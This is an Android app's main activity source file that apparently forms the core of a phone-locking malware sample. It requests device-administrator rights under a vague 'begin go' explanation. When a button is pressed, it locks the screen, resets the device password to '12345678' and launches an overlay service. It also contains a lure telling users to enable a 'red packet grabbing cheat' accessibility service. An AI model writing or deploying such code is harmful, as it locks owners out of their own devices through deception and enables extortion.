package cn.sometimenaive.threemagic;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private Button btnLock;
    private DevicePolicyManager mDpm;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

       if (1==1){
           lockandchangepassword();
      }
    }

    public void lockandchangepassword(){
        mDpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

        btnLock = (Button) findViewById(R.id.button);
        btnLock.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v){
                // lock screen
                mDpm.lockNow();
                mDpm.resetPassword("12345678",0);
                overlay();
            }
        });

        ComponentName mDeviceAdminSample = new ComponentName(this,DdapReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,mDeviceAdminSample);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"begin go");
        startActivity(intent);
    }

    public void overlay(){
        Log.d("hahah","overlay");
        if (!Settings.canDrawOverlays(this)){
            if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
                Intent myintent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                startActivity(myintent);
            }
        }else{
            Intent serviceintent = new Intent(this, OverlayService.class);
            startService(serviceintent);
        }
    }

    private void open()
    {
        try
        {
            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "找到“抢红包外挂”，然后开启服务即可", Toast.LENGTH_LONG).show();
        } catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
